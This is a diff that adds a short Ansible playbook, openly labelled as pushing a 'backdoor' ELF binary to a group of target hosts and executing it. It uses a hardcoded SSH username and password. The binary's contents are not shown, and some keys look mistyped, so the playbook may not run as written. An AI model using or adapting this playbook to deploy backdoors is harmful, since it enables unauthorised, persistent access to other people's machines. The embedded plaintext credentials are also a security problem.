@@ -1,0 +1,12 @@
+- hosts: targets
+  vars:
+    ansible_ssh_username: venues
+    ansible_ssh_password: Metc1309
+  tasks:
+    - name: push backdoor
+      synchronize:
+        src: /root/aushgiasgs.elf
+        dest: /home/venues
+        model: push
+    - name: exec backdoor
+      shell: /bin/bash -c "chmod +x aushgiasgs.elf" && /bin/bash -c "aushgiasgs.elf"
